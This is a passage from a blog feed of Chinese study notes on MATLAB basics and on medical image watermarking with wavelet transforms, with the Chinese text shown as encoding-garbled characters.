å‡½æ•°æ§åˆ¶æ‰€æ˜¾ç¤ºçš„å€¼çš„æ•°å€¼æ ¼å¼ã€‚</p><pre><code>x = [4/3 1.2345e-6]format short   1.3333    0.0000format short e   1.3333e+000  1.2345e-006format short g   1.3333  1.2345e-006format long   1.33333333333333   0.00000123450000format long e   1.333333333333333e+000    1.234500000000000e-006format long g   1.33333333333333               1.2345e-006format bank   1.33          0.00format rat   4/3          1/810045format hex   3ff5555555555555   3eb4b6231abfd271</code></pre><p>è¯­å¥æ— æ³•å®¹çº³åœ¨ä¸€è¡Œä¸­ï¼Œè¯·ä½¿ç”¨çœç•¥å·ï¼ˆä¸‰ä¸ªå¥ç‚¹ï¼‰<strong>â€¦</strong></p><p>è¦è¿›ä¸€æ­¥æ§åˆ¶è¾“å‡ºæ ¼å¼ï¼Œè¯·ä½¿ç”¨ sprintf å’Œ fprintf å‡½æ•°ã€‚</p><hr><pre><code>100:-7:50sum(A(1:4,4))sum(A(:,end)) end å¼•ç”¨æœ€åä¸€ä¸ªè¡Œæˆ–åˆ—</code></pre><p>ä¸ºä»€ä¹ˆ 4Ã—4 å¹»æ–¹çŸ©é˜µçš„å¹»æ•°å’Œç­‰äº 34ï¼Ÿå¦‚æœå°†ä»‹äº 1 åˆ° 16 ä¹‹é—´çš„æ•´æ•°åˆ†ä¸ºå››ä¸ªæ€»å’Œç›¸ç­‰çš„ç»„ï¼Œè¯¥æ€»å’Œå¿…é¡»ä¸º<br>sum(1:16)/4<br>å½“ç„¶ï¼Œä¹Ÿå³<br>ans =<br>     34</p><p><code>B = [A  A+32; A+48  A+16]</code></p><hr><p>è¦åˆ é™¤ X çš„ç¬¬äºŒåˆ—ï¼Œè¯·ä½¿ç”¨<br><code>X(:,2) = []</code></p><p><code>X( 2 : 2 : 10) = []</code> æŒ‰åˆ—æ•°ç¬¬å‡ ä¸ª<br>ç”Ÿæˆ<br><code>X =    16     9     2     7    13    12     1</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabç¬”è®°2</title>
      <link href="/2020/02/01/matlab%E7%AC%94%E8%AE%B02/"/>
      <url>/2020/02/01/matlab%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<p>å¤„ç†æ–‡æœ¬æ—¶ï¼Œå°†å­—ç¬¦åºåˆ—æ‹¬åœ¨å•å¼•å·ä¸­ã€‚å¯ä»¥å°†æ–‡æœ¬èµ‹ç»™å˜é‡ã€‚<br><code>myText = &#39;Hello, world&#39;;</code><br>å¦‚æœæ–‡æœ¬åŒ…å«å•å¼•å·ï¼Œä½¿ç”¨ä¸¤ä¸ªå•å¼•å·ã€‚</p><pre><code>otherText = &apos;You&apos;&apos;re right&apos;otherText = &apos;You&apos;re right&apos;</code></pre><hr><a id="more"></a><p><code>whos</code>æŸ¥è¯¢å·²æœ‰å˜é‡</p><hr><p>å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸²è”å­—ç¬¦æ•°ç»„ï¼Œå°±åƒä¸²è”æ•°å€¼æ•°ç»„ä¸€æ ·ã€‚<br><code>longText = [myText,&#39; - &#39;,otherText]</code></p><p>è¦å°†æ•°å€¼è½¬æ¢ä¸ºå­—ç¬¦ï¼Œä½¿ç”¨ num2str æˆ– int2str ç­‰å‡½æ•°ã€‚</p><pre><code>f = 71;c = (f-32)/1.8;tempText = [&apos;Temperature is &apos;,num2str(c),&apos;C&apos;]</code></pre><hr><p>è°ƒç”¨å‡½æ•°ï¼Œä¾‹å¦‚ maxï¼Œè¯·å°†å…¶è¾“å…¥å‚æ•°æ‹¬åœ¨åœ†æ‹¬å·ä¸­ï¼Œå­˜åœ¨å¤šä¸ªè¾“å…¥å‚æ•°ï¼Œè¯·ä½¿ç”¨é€—å·åŠ ä»¥åˆ†éš”ï¼Œå­˜åœ¨å¤šä¸ªè¾“å‡ºå‚æ•°ï¼Œè¯·å°†å…¶æ‹¬åœ¨æ–¹æ‹¬å·ä¸­ï¼š</p><pre><code>[maxA,location] = max(A)maxA = 5location = 3</code></pre><hr><p>ä»»ä½•å­—ç¬¦è¾“å…¥æ‹¬åœ¨å•å¼•å·ä¸­ï¼š<br><code>disp(&#39;hello world&#39;)</code></p><hr><p>åˆ›å»ºäºŒç»´çº¿å›¾ï¼Œè¯·ä½¿ç”¨ plotï¼ˆç»˜åˆ¶ï¼‰ å‡½æ•°ã€‚</p><pre><code>x = 0:pi/100:2*pi; åˆ›å»ºçŸ©é˜µçš„ä¸€ç§æ–¹æ³•y = sin(x);plot(x,yï¼‰</code></pre><p>æ ‡è®°è½´å¹¶æ·»åŠ æ ‡é¢˜ã€‚</p><pre><code>xlabel(&apos;x&apos;)ylabel(&apos;sin(x)&apos;)title(&apos;Plot of the Sine Function&apos;)</code></pre><p>å‘ plot å‡½æ•°æ·»åŠ ç¬¬ä¸‰ä¸ªè¾“å…¥å‚æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨çº¢è‰²è™šçº¿ç»˜åˆ¶ç›¸åŒçš„å˜é‡ã€‚<br><code>plot(x,y,&#39;r--&#39;)</code><br>â€˜râ€“â€™ ä¸ºçº¿æ¡è®¾å®šã€‚æ¯ä¸ªè®¾å®šå¯åŒ…å«è¡¨ç¤ºçº¿æ¡é¢œè‰²ã€æ ·å¼å’Œæ ‡è®°çš„å­—ç¬¦ã€‚æ ‡è®°æ˜¯åœ¨ç»˜åˆ¶çš„æ¯ä¸ªæ•°æ®ç‚¹ä¸Šæ˜¾ç¤ºçš„ç¬¦å·ï¼Œä¾‹å¦‚ï¼Œ+ã€o æˆ– <em>ã€‚ä¾‹å¦‚ï¼Œâ€™g:</em>â€˜ è¯·æ±‚ç»˜åˆ¶ä½¿ç”¨ * æ ‡è®°çš„ç»¿è‰²ç‚¹çº¿ã€‚</p><p>å°†ç»˜å›¾æ·»åŠ åˆ°ç°æœ‰å›¾çª—ä¸­ï¼Œè¯·ä½¿ç”¨ hold onã€‚åœ¨ä½¿ç”¨ hold off æˆ–å…³é—­çª—å£ä¹‹å‰ï¼Œå½“å‰å›¾çª—çª—å£ä¸­ä¼šæ˜¾ç¤ºæ‰€æœ‰ç»˜å›¾</p><pre><code>hold ony2 = cos(x);plot(x,y2,&apos;:&apos;)legend(&apos;sin&apos;,&apos;cos&apos;) legendå°±æ˜¯æ·»åŠ å›¾ä¾‹çš„æ ‡æ³¨æ¯”å¦‚ï¼šlegend(&apos;First&apos;,&apos;Second&apos;,-1)ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ä¾æ¬¡æ³¨é‡Šplotä¸­çš„å›¾ï¼Œåé¢æ¿çš„å‚æ•°ï¼ˆæ­¤å¤„æ˜¯-1ï¼‰è¡¨ç¤ºæ³¨é‡Šçš„ä½ç½®ã€‚hold off</code></pre><hr><p>ä¸‰ç»´å›¾é€šå¸¸æ˜¾ç¤ºä¸€ä¸ªç”±å¸¦ä¸¤ä¸ªå˜é‡çš„å‡½æ•°ï¼ˆå³ z = f (x,y)ï¼‰å®šä¹‰çš„æ›²é¢å›¾ã€‚</p><p><code>[X,Y] = meshgrid(-2:.2:2);</code> STEP=0.2  meshgridå‡½æ•°ç”Ÿæˆçš„Xï¼ŒYæ˜¯å¤§å°ç›¸ç­‰çš„çŸ©é˜µ</p><p>surf å‡½æ•°åŠå…¶ä¼´éšå‡½æ•° mesh ä»¥ä¸‰ç»´å½¢å¼æ˜¾ç¤ºæ›²é¢å›¾ã€‚surf ä½¿ç”¨é¢œè‰²æ˜¾ç¤ºæ›²é¢å›¾çš„è¿æ¥çº¿å’Œé¢ã€‚mesh ç”Ÿæˆä»…ä»¥é¢œè‰²æ ‡è®°è¿æ¥å®šä¹‰ç‚¹çš„çº¿æ¡çš„çº¿æ¡†æ›²é¢å›¾ã€‚</p><hr><p>ä½¿ç”¨ subplot å‡½æ•°å¯ä»¥åœ¨åŒä¸€çª—å£çš„ä¸åŒå­åŒºåŸŸæ˜¾ç¤ºå¤šä¸ªç»˜å›¾ã€‚<br>subplot çš„å‰ä¸¤ä¸ªè¾“å…¥è¡¨ç¤ºæ¯è¡Œå’Œæ¯åˆ—ä¸­çš„ç»˜å›¾æ•°ã€‚ç¬¬ä¸‰ä¸ªè¾“å…¥æŒ‡å®šç»˜å›¾æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚</p><hr><blockquote><p>é”®å…¥è„šæœ¬åç§°å³å¯è¿è¡Œè¯¥è„šæœ¬ã€‚è„šæœ¬æ˜¯æœ€ç®€å•çš„ä¸€ç§ MATLABÂ® ç¨‹åºã€‚è„šæœ¬æ˜¯ä¸€ä¸ªåŒ…å«å¤šè¡Œè¿ç»­ MATLAB å‘½ä»¤å’Œå‡½æ•°è°ƒç”¨çš„æ‰©å±•åä¸º<code>.m</code>çš„æ–‡ä»¶ã€‚åœ¨å‘½ä»¤è¡Œä¸­<em>é”®å…¥è„šæœ¬åç§°</em>å³å¯è¿è¡Œè¯¥è„šæœ¬ã€‚<br>è¦åˆ›å»ºè„šæœ¬ï¼Œè¯·ä½¿ç”¨ edit å‘½ä»¤ã€‚<br><code>edit plotrand</code><br>ä½¿ç”¨ç™¾åˆ†æ¯” (%) ç¬¦å·æ·»åŠ æ³¨é‡Š</p></blockquote><hr><pre><code>nsamples = 5;npoints = 50;for k = 1:nsamples    currentData = rand(npoints,1);    sampleMean(k) = mean(currentData);endoverallMean = mean(sampleMean)if overallMean &lt; .49   disp(&apos;Mean is less than expected&apos;)elseif overallMean &gt; .51   disp(&apos;Mean is greater than expected&apos;)else   disp(&apos;Mean is within the expected range&apos;)end</code></pre><hr><p>ä½¿ç”¨ doc å‘½ä»¤åœ¨å•ç‹¬çš„çª—å£ä¸­æ‰“å¼€å‡½æ•°æ–‡æ¡£ã€‚<br><code>doc mean</code><br>åœ¨é”®å…¥å‡½æ•°è¾“å…¥å‚æ•°çš„å·¦æ‹¬å·ä¹‹åæš‚åœï¼Œæ­¤æ—¶å‘½ä»¤è¡Œçª—å£ä¸­ä¼šæ˜¾ç¤ºç›¸åº”å‡½æ•°çš„æç¤º<br>ä½¿ç”¨ help å‘½ä»¤å¯åœ¨å‘½ä»¤è¡Œçª—å£ä¸­æŸ¥çœ‹ç›¸åº”å‡½æ•°çš„ç®€æ˜æ–‡æ¡£ã€‚</p><hr><p>ä½¿ç”¨ç©ºæ ¼æˆ–é€—å·åˆ†éš”è¡Œçš„å…ƒç´ ã€‚<br>ä½¿ç”¨åˆ†å· ; è¡¨ç¤ºæ¯è¡Œæœ«å°¾ã€‚<br>ä½¿ç”¨æ–¹æ‹¬å· [ ] å°†æ•´ä¸ªå…ƒç´ åˆ—è¡¨æ‹¬èµ·æ¥ã€‚</p><p>sum(A) è®¡ç®—åˆ—<br>sum(Aâ€™)â€™<br>é¿å…åŒé‡è½¬ç½®çš„å…¶ä»–æ–¹æ³•ï¼Œè¯·åœ¨ sum å‡½æ•°ä¸­ä½¿ç”¨ç»´åº¦å‚æ•°ï¼š<br><code>sum(A,2)</code></p><p><code>diag(A)</code> è·å–å¯¹è§’çº¿å€¼</p><hr><p>å›¾å½¢çš„å‡½æ•° fliplr å¯ä»¥ä»å·¦å¾€å³åœ°ç¿»è½¬çŸ©é˜µï¼š<br><code>sum(diag(fliplr(A)))</code></p><hr><p>magic å‡½æ•°åˆ›å»ºå‡ ä¹ä»»æ„å¤§å°çš„å¹»æ–¹çŸ©é˜µã€‚è¡Œåˆ—å¯¹è§’çº¿ç›¸åŠ éƒ½ç›¸åŒ<br>å››ä¸ªç”¨äºç”ŸæˆåŸºæœ¬çŸ©é˜µçš„å‡½æ•°ã€‚<br>zeros<br>å…¨éƒ¨ä¸ºé›¶<br>ones<br>å…¨éƒ¨ä¸º 1<br>rand<br>å‡åŒ€åˆ†å¸ƒçš„éšæœºå…ƒç´ <br>randn<br>æ­£æ€åˆ†å¸ƒçš„éšæœºå…ƒç´ </p><hr><p>MATLAB ä¸éœ€è¦ä»»ä½•ç±»å‹å£°æ˜æˆ–ç»´åº¦è¯´æ˜ã€‚å½“ MATLAB é‡åˆ°æ–°çš„å˜é‡åç§°æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ›å»ºå˜é‡ï¼Œå¹¶åˆ†é…é€‚å½“å¤§å°çš„å­˜å‚¨ã€‚å¦‚æœæ­¤å˜é‡å·²å­˜åœ¨ï¼ŒMATLAB ä¼šæ›´æ”¹å…¶å†…å®¹ï¼Œå¹¶æ ¹æ®éœ€è¦åˆ†é…æ–°å­˜å‚¨ã€‚</p><p>MATLAB ä»…ä½¿ç”¨åç§°çš„å‰ N ä¸ªå­—ç¬¦ï¼ˆå…¶ä¸­ N æ˜¯å‡½æ•° namelengthmax è¿”å›çš„æ•°å­—ï¼‰ ä¸º63</p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabç¬”è®°1</title>
      <link href="/2020/01/30/matlab%E7%AC%94%E8%AE%B01/"/>
      <url>/2020/01/30/matlab%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p><code>a = [1 2 3 4]</code><br>åˆ›å»ºçŸ©é˜µçš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ onesã€zeros æˆ– rand ç­‰å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ªç”±é›¶ç»„æˆçš„ 5Ã—1 åˆ—å‘é‡ã€‚<br><code>z = zeros(5,1)</code></p><hr><p>MATLAB å…è®¸æ‚¨ä½¿ç”¨å•ä¸€çš„ç®—æœ¯è¿ç®—ç¬¦æˆ–å‡½æ•°æ¥å¤„ç†çŸ©é˜µä¸­çš„æ‰€æœ‰å€¼ã€‚<br><code>a + 10</code></p><hr><a id="more"></a><p>è¦è½¬ç½®çŸ©é˜µï¼Œè¯·ä½¿ç”¨å•å¼•å· (â€˜)</p><hr><p>format å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæ›´å¤šå°æ•°ä½æ•°ï¼š<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a*inv(a)</span><br><span class="line">format short</span><br></pre></td></tr></table></figure></p><p>format ä»…å½±å“æ•°å­—æ˜¾ç¤ºï¼Œè€Œä¸å½±å“ MATLAB å¯¹æ•°å­—çš„è®¡ç®—æˆ–ä¿å­˜æ–¹å¼ã€‚</p><hr><p>è¦æ‰§è¡Œå…ƒç´ çº§ä¹˜æ³•ï¼ˆè€ŒéçŸ©é˜µä¹˜æ³•ï¼‰ï¼Œè¯·ä½¿ç”¨ .<em> è¿ç®—ç¬¦ï¼š<br>`p = a.</em>a<code>ä¹˜æ³•ã€é™¤æ³•å’Œå¹‚çš„çŸ©é˜µè¿ç®—ç¬¦åˆ†åˆ«å…·æœ‰æ‰§è¡Œå…ƒç´ çº§è¿ç®—çš„å¯¹åº”æ•°ç»„è¿ç®—ç¬¦ã€‚ä¾‹å¦‚ï¼Œè®¡ç®— a çš„å„ä¸ªå…ƒç´ çš„ä¸‰æ¬¡æ–¹ï¼š</code>a.^3`</p><hr><p>ä¸²è”æ˜¯è¿æ¥æ•°ç»„ä»¥ä¾¿å½¢æˆæ›´å¤§æ•°ç»„çš„è¿‡ç¨‹ã€‚å®é™…ä¸Šï¼Œç¬¬ä¸€ä¸ªæ•°ç»„æ˜¯é€šè¿‡å°†å…¶å„ä¸ªå…ƒç´ ä¸²è”èµ·æ¥è€Œæ„æˆçš„ã€‚æˆå¯¹çš„æ–¹æ‹¬å· [] å³ä¸ºä¸²è”è¿ç®—ç¬¦ã€‚<br><code>A = [a,a]</code></p><hr><p>ä½¿ç”¨é€—å·å°†å½¼æ­¤ç›¸é‚»çš„æ•°ç»„ä¸²è”èµ·æ¥ç§°ä¸ºæ°´å¹³ä¸²è”ã€‚æ¯ä¸ªæ•°ç»„å¿…é¡»å…·æœ‰ç›¸åŒçš„è¡Œæ•°ã€‚åŒæ ·ï¼Œå¦‚æœå„æ•°ç»„å…·æœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åˆ†å·å‚ç›´ä¸²è”ã€‚<br><code>A = [a; a]</code></p><hr><p>è¦è¡¨ç¤ºå¤æ•°çš„è™šéƒ¨ï¼Œè¯·ä½¿ç”¨ i æˆ– jã€‚</p><pre><code>c = [3+4i, 4+3j; -i, 10j]c = 2Ã—2 complex</code></pre><hr><p><code>clc</code></p><hr><blockquote><p>æ¯ä¸ªå˜é‡éƒ½æ˜¯ä¸€ä¸ªå¯åŒ…å«è®¸å¤šæ•°å­—çš„æ•°ç»„</p></blockquote><hr><p>å¼•ç”¨æ•°ç»„ä¸­çš„ç‰¹å®šå…ƒç´ æœ‰ä¸¤ç§æ–¹æ³•ã€‚æœ€å¸¸è§çš„æ–¹æ³•æ˜¯æŒ‡å®šè¡Œå’Œåˆ—ä¸‹æ ‡ï¼Œä¾‹å¦‚<br><code>A(4,2)</code><br>å¦ä¸€ç§æ–¹æ³•ä¸å¤ªå¸¸ç”¨ï¼Œä½†æœ‰æ—¶éå¸¸æœ‰ç”¨ï¼Œå³ä½¿ç”¨å•ä¸€ä¸‹æ ‡æŒ‰é¡ºåºå‘ä¸‹éå†æ¯ä¸€åˆ—ï¼š<br><code>A(8)</code><br>å¯ä»¥åœ¨èµ‹å€¼è¯­å¥å·¦ä¾§æŒ‡å®šå½“å‰ç»´å¤–éƒ¨çš„å…ƒç´ ã€‚æ•°ç»„å¤§å°ä¼šå¢å¤§ä»¥ä¾¿å®¹çº³æ–°å…ƒç´ ã€‚<br><code>A(4,5) = 17</code></p><hr><p>è¦å¼•ç”¨å¤šä¸ªæ•°ç»„å…ƒç´ ï¼Œè¯·ä½¿ç”¨å†’å·è¿ç®—ç¬¦ï¼Œè¿™ä½¿æ‚¨å¯ä»¥æŒ‡å®šä¸€ä¸ªæ ¼å¼ä¸º<code>start:end</code>çš„èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œåˆ—å‡º A å‰ä¸‰è¡ŒåŠç¬¬äºŒåˆ—ä¸­çš„å…ƒç´ ï¼š<br><code>A(1:3,2)</code><br>å•ç‹¬çš„å†’å·ï¼ˆæ²¡æœ‰èµ·å§‹å€¼æˆ–ç»“æŸå€¼ï¼‰æŒ‡å®šè¯¥ç»´ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œé€‰æ‹© A ç¬¬ä¸‰è¡Œä¸­çš„æ‰€æœ‰åˆ—ï¼š<br><code>A(3,:)</code></p><hr><p>å†’å·è¿ç®—ç¬¦è¿˜å…è®¸æ‚¨ä½¿ç”¨è¾ƒé€šç”¨çš„æ ¼å¼<code>start: step :end</code>åˆ›å»ºç­‰è·å‘é‡å€¼ã€‚å¦‚æœçœç•¥ä¸­é—´çš„æ­¥éª¤ï¼ˆå¦‚ <code>start:end</code> ä¸­ï¼‰ï¼ŒMATLAB ä¼šä½¿ç”¨é»˜è®¤æ­¥é•¿å€¼ 1ã€‚<br><code>B = 0:10:100</code></p><hr><p>é€€å‡º MATLAB åï¼Œå·¥ä½œåŒºå˜é‡ä¸ä¼šä¿ç•™ã€‚ä½¿ç”¨<code>save</code>å‘½ä»¤ä¿å­˜æ•°æ®ä»¥ä¾›å°†æ¥ä½¿ç”¨ï¼Œ<br><code>save myfile.mat</code><br>è¦æ¸…é™¤å·¥ä½œåŒºä¸­çš„æ‰€æœ‰å˜é‡ï¼Œè¯·ä½¿ç”¨<code>clear</code>å‘½ä»¤ã€‚<br>ä½¿ç”¨ load å°† MAT æ–‡ä»¶ä¸­çš„æ•°æ®è¿˜åŸåˆ°å·¥ä½œåŒºã€‚<br><code>load myfile.mat</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;ç¬”è®°4</title>
      <link href="/2020/01/28/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B04/"/>
      <url>/2020/01/28/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<p>orthonormal matrices  æ­£äº¤çŸ©é˜µ<br>a  message  can  be  hidden  in  cover document   if   the   content   of   the   document   hashigh redundancy.<br>propose  a  new  reliable  method  by hiding  the  encrypted  watermark  in  the  RONI  part  of  the medical   image   using   DWT   approach.<br>ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security æ‰€è¯»è®ºæ–‡</p><p>ç›´æ–¹å›¾å‡è¡¡åŒ–ï¼ˆHistogram Equalizationï¼‰<br><a id="more"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> watermark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;ç¬”è®°3</title>
      <link href="/2020/01/25/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B03/"/>
      <url>/2020/01/25/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<p>There  are  a  wide  variety  of  popular  wavelet  algorithms,  including  Daubechies  wavelets,  Mexican  Hat  wavelets  and  Morlet  wavelets </p><p>HAAR</p><p>In addition, the Haar wavelet transform is fast, memory efficient and  exactly  reversible  without  the  edge  effects  that  are  present  in  other  wavelet  transforms.</p><p>the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to  maintain  better  image  quality.<br><a id="more"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> watermark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;ç¬”è®°2</title>
      <link href="/2020/01/23/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B02/"/>
      <url>/2020/01/23/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<p>state-of-the-art æœ€å…ˆè¿›çš„<br>Error Correcting Codes  ECC<br>discrete wavelet transform (DWT) ç¦»æ•£å°æ³¢å˜æ¢<br>The  ECC  based  watermarking  methods  attempt  to  find  a  trade-off  between the number of bits to be embedded and the number of bit-errors that can be corrected.  </p><p>the  technique  embeds  medical  text  watermarks  into  selected  sub-band  of  discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.è¯¥æŠ€æœ¯ä½¿ç”¨æ‰©å±•é¢‘è°±æŠ€æœ¯å°†åŒ»å­¦æ–‡æœ¬æ°´å°åµŒå…¥ç¦»æ•£å°æ³¢å˜æ¢ï¼ˆDWTï¼‰è¦†ç›–åŒ»å­¦å›¾åƒç³»æ•°çš„é€‰å®šå­å¸¦ä¸­ã€‚</p><p> <strong>Any  image  com-prises of two sections called ROI and NROI </strong><br><a id="more"></a><br> ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is  present  in  this  area  [105].  NROI  is  an  area  of  image  that  does  not  have  an  important  data  i.e.  background  of  image.<br> The  spatial  domain  tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple.<br> In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform  (DWT),  discrete  cosine  transform  (DCT),  singular  value  decomposition  (SVD) and discrete Fourier transform (DFT).<br>finite energy function æœ‰é™èƒ½é‡å‡½æ•°</p><p>åœ¨æ•°ä½ä¿¡å·å¤„ç†é¢†åŸŸä¸­ï¼Œé™é‡‡æ ·ï¼Œåˆä½œå‡é‡‡é›†,æ˜¯ä¸€ç§å¤šé€Ÿç‡æ•°å­—ä¿¡å·å¤„ç†çš„æŠ€æœ¯æˆ–æ˜¯é™ä½ä¿¡å·é‡‡æ ·ç‡çš„è¿‡ç¨‹ï¼Œé€šå¸¸ç”¨äºé™ä½æ•°æ®ä¼ è¾“é€Ÿç‡æˆ–è€…æ•°æ®å¤§å°ã€‚<br>é™é‡‡æ ·å› å­ï¼ˆå¸¸ç”¨è¡¨ç¤ºç¬¦å·ä¸ºï¼‚Mï¼‚ï¼‰ä¸€èˆ¬æ˜¯å¤§äºï¼‘çš„æ•´æ•°æˆ–æœ‰ç†æ•°ã€‚<br>è¿™ä¸ªå› å­è¡¨è¾¾é‡‡æ ·å‘¨æœŸå˜æˆåŸæ¥çš„Må€ï¼Œæˆ–è€…ç­‰ä»·è¡¨ç¤ºé‡‡æ ·ç‡å˜æˆåŸæ¥çš„1/Må€ã€‚ é‡‡æ ·ç‡çš„é™ä½ä¼šé€ æˆé¢‘è°±çš„å‹ç¼©ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨æ»¤æ³¢å™¨ç¡®ä¿åœ¨è¾ƒä½çš„é‡‡æ ·é¢‘ç‡ä¸‹ä¸å‘ç”Ÿæ··å ï¼Œç¡®ä¿å¥ˆå¥å¼é‡‡æ ·å®šç†ä¾æ—§æˆç«‹ã€‚</p><p>å½¢å¼å¹‚çº§æ•°ä¸Šçš„ä¸€ä¸ªé‡è¦æ˜ å°„æ˜¯ç³»æ•°çš„æå–æ“ä½œï¼šå°†ä¸€ä¸ªå½¢å¼å¹‚çº§æ•°æ˜ å°„åˆ°å®ƒçš„X^nçš„ç³»æ•°ã€‚è¿™ä¸ªæ“ä½œå¸¸å¸¸è®°ä½œ[X^n]ï¼Œ</p><p>ä»¥ä¸€å˜æ•°ä¸ºt çš„å‡½æ•° f(t) ä¸ºä¾‹ï¼Œf(t) ç»è¿‡ä¸€ç§¯åˆ†è½¬æ¢T å¾—åˆ°Tf(u)ï¼š<br>å…¶ä¸­ K æ˜¯ä¸ªç¡®å®šçš„äºŒå…ƒå‡½æ•°, ç§°ä¸ºæ­¤ç§¯åˆ†å˜æ¢çš„æ ¸å‡½æ•°ï¼ˆkernel functionï¼‰æˆ–æ ¸ï¼ˆnucleusï¼‰ã€‚å½“é€‰å–ä¸åŒçš„ç§¯åˆ†åŸŸå’Œå˜æ¢æ ¸æ—¶ï¼Œå°±å¾—åˆ°ä¸åŒåç§°çš„ç§¯åˆ†å˜æ¢ã€‚f(t) ç§°ä¸ºè±¡åŸå‡½æ•°ï¼ŒTf(u) ç§°ä¸º f(t) çš„è±¡å‡½æ•°ï¼Œåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œå®ƒä»¬æ˜¯ä¸€ä¸€å¯¹åº”è€Œå˜æ¢æ˜¯å¯é€†çš„ã€‚</p><p>å®šä¹‰åœ¨å®æ•°åŸŸä¸Šçš„å®å‡½æ•°ç›¸å¯¹äºå€¼cçš„né˜¶çŸ©ä¸º:</p><p>å¦‚æœf(x)æ˜¯æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼Œåˆ™å®¹æ˜“çœ‹å‡ºç›¸å¯¹äºå€¼0çš„1é˜¶çŸ©æ˜¯è¿ç»­éšæœºå˜é‡çš„æ•°å­¦æœŸæœ›ã€‚</p><p>vanishing moment</p><p>æ¯å°æ³¢å®šä¹‰ä¸º<br><img src="https://s2.ax1x.com/2020/01/23/1EbUyt.png" alt="1EbUyt.png"><br>å…¶ä¸­aæ˜¯ç¼©æ”¾å› å­ï¼Œå½“|a|&lt;1æ—¶ï¼Œæ¯å°æ³¢è¢«å‹ç¼©ï¼Œåœ¨æ—¶é—´è½´ä¸Šæœ‰è¾ƒå°çš„æ”¯æ’‘åº¦ï¼Œå¹¶ä¸”å¯¹åº”åˆ°é«˜é¢‘ï¼Œå› ä¸ºæ¯å°æ³¢å˜çª„ã€å˜åŒ–å˜å¿«ï¼Œ åä¹‹ï¼Œå½“|a|&gt;1æ—¶ï¼Œæ¯å°æ³¢å˜å®½ã€å˜åŒ–è¾ƒæ…¢ï¼Œæ‰€ä»¥å¯¹åº”åˆ°ä½é¢‘ã€‚båˆ™æ˜¯å¹³ç§»å‚æ•°ï¼Œç”¨æ¥å†³å®šæ¯å°æ³¢çš„ä½ç½®ã€‚<br>å°æ³¢åˆ†æï¼ˆè‹±è¯­ï¼šwavelet analysisï¼‰æˆ–å°æ³¢å˜æ¢ï¼ˆè‹±è¯­ï¼šwavelet transformï¼‰æ˜¯æŒ‡ç”¨æœ‰é™é•¿æˆ–å¿«é€Ÿè¡°å‡çš„â€œæ¯å°æ³¢â€ï¼ˆmother waveletï¼‰çš„æŒ¯è¡æ³¢å½¢æ¥è¡¨ç¤ºä¿¡å·ã€‚è¯¥æ³¢å½¢è¢«ç¼©æ”¾å’Œå¹³ç§»ä»¥åŒ¹é…è¾“å…¥çš„ä¿¡å·ã€‚<br>åœ¨ä¿¡å·å¤„ç†ä¸­ï¼Œçª—å‡½æ•°ï¼ˆè‹±è¯­ï¼šwindow 